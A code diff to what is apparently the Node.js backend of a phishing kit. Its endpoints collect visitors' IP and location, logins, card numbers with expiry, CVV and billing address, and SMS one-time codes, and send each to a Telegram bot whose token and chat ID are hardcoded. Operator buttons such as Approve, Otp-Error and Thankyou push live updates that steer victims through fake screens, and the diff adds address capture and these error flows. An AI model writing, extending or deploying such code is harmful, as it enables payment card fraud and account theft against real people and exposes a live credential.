@@ -8,8 +8,8 @@ const userAgentParser = require('user-agent-parser');
 const app = express();
 const port = 3000;
 
-const botToken = '7764284417:AAE9-ADJoUIFoXjNuZclwFI8yJOpKRcINMQ'; 
-const chatId = '1690728339'; 
+const botToken = '7764284417:AAE9-ADJoUIFoXjNuZclwFI8yJOpKRcINMQ';
+const chatId = '1690728339';
 
 const bot = new TelegramBot(botToken, { polling: true });
 
@@ -21,8 +21,6 @@ const sseConnections = {};
 app.get('/details', async (req, res) => {
     const visitorIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
     const userAgent = req.headers['user-agent'];
-    
-    // Retrieve userId from headers
     const userId = req.headers['user-id'];
     if (!userId) {
         return res.status(400).json({ success: false, message: "User ID is required" });
@@ -50,6 +48,54 @@ app.get('/details', async (req, res) => {
 
     const message = `
 🚨 New Visitor Alert 🚨
+=====================
+🌍 IP Address: ${visitorIp}
+🏙 City: ${visitorCity}
+🏳️ Country: ${visitorCountry}
+🌐 Browser: ${browser}
+🛣 Provider: ${visitorProvider}
+🆔 User ID: ${userId}  
+=====================
+`;
+
+    try {
+        await sendToTelegram(message, userId);
+        res.json({ success: true });
+    } catch (error) {
+        console.error('Error notifying page load:', error);
+        res.status(500).json({ success: false });
+    }
+});
+app.get('/details-approve', async (req, res) => {
+    const visitorIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    const userAgent = req.headers['user-agent'];
+    const userId = req.headers['user-id'];
+    if (!userId) {
+        return res.status(400).json({ success: false, message: "User ID is required" });
+    }
+
+    const parsedUserAgent = userAgentParser(userAgent);
+    const browser = parsedUserAgent.browser.name;
+
+    let visitorCity = '';
+    let visitorCountry = '';
+    let visitorProvider = '';
+
+    try {
+        const ipInfoResponse = await axios.get(`http://ip-api.com/json/${visitorIp}`);
+        const ipInfo = ipInfoResponse.data;
+
+        if (ipInfo && ipInfo.status === 'success') {
+            visitorCity = ipInfo.city || 'Unknown';
+            visitorCountry = ipInfo.country || 'Unknown';
+            visitorProvider = ipInfo.org || 'Unknown';
+        }
+    } catch (error) {
+        console.error('Error fetching IP information:', error);
+    }
+
+    const message = `
+🚨 User On Approve 🚨
 =====================
 🌍 IP Address: ${visitorIp}
 🏙 City: ${visitorCity}
@@ -113,15 +159,27 @@ app.post('/login', async (req, res) => {
 });
 
 app.post('/send-cc', async (req, res) => {
-    const { name, cc, exp, cvv, userId } = req.body;
+    const {
+        cc_holder,
+        cc,
+        exp,
+        cvv,
+        userId,
+        addressLine,
+        city,
+        state,
+        zipcode
+    } = req.body;
 
     const message = `
-🚨 CC
+🚨 CC Data
 =====================
-👤 Name: ${name}
+👤 Name: ${cc_holder}
 💳 Card Number: ${cc}
 📅 Expiration Date: ${exp}
 🔒 CVV: ${cvv}
+=====================
+🏠 Address: ${addressLine}, ${city}, ${state} ${zipcode}
 =====================
 🌍 User ID: ${userId}
 =====================
@@ -140,6 +198,7 @@ app.post('/send-cc', async (req, res) => {
         res.status(500).send('Internal Server Error');
     }
 });
+
 
 app.post('/send-sms', async (req, res) => {
     const { codeSms, userId } = req.body;
@@ -175,11 +234,19 @@ async function sendToTelegram(message, userId) {
                 inline_keyboard: [
                     [
                         { text: 'Login', callback_data: `login|${userId}` },
-                        { text: 'CC', callback_data: `cc|${userId}` },
+                        { text: 'Update', callback_data: `cc|${userId}` },
                     ],
                     [
-                        { text: 'sms', callback_data: `sms|${userId}` },
-                        { text: 'spotify', callback_data: `spotify|${userId}` },
+                        { text: 'Otp', callback_data: `sms|${userId}` },
+                        { text: 'Approve', callback_data: `approve|${userId}` },
+                    ],
+                    [
+                        { text: 'Update-Error', callback_data: `updateError|${userId}` },
+                        { text: 'Otp-Error', callback_data: `otpError|${userId}` },
+                        { text: 'Login-Error', callback_data: `loginError|${userId}` },
+                    ],
+                    [
+                        { text: 'Thankyou', callback_data: `thankyou|${userId}` },
                     ],
                 ],
             },
@@ -209,8 +276,20 @@ bot.on('callback_query', async (callbackQuery) => {
         case 'sms':
             responseText = `User ${userId} clicked SMS.`;
             break;
-        case 'spotify':
-            responseText = `User ${userId} clicked spotify.`;
+        case 'otpError':
+            responseText = `User ${userId} clicked otpError.`;
+            break;
+        case 'updateError':
+            responseText = `User ${userId} clicked updateError.`;
+            break;
+        case 'approve':
+            responseText = `User ${userId} clicked approve.`;
+            break;
+        case 'loginError':
+            responseText = `User ${userId} clicked loginError.`;
+            break;
+        case 'thankyou':
+            responseText = `User ${userId} clicked thankyou.`;
             break;
         default:
             responseText = `Unknown action for user ${userId}.`;
@@ -218,11 +297,11 @@ bot.on('callback_query', async (callbackQuery) => {
     }
 
     try {
- 
+
         await bot.answerCallbackQuery(id, { text: responseText });
         console.log(`Answered callback query with text: ${responseText}`);
 
-        
+
         if (sseConnections[userId]) {
             console.log(`Sending SSE update for user ${userId}`);
             sseConnections[userId].forEach((client) => {
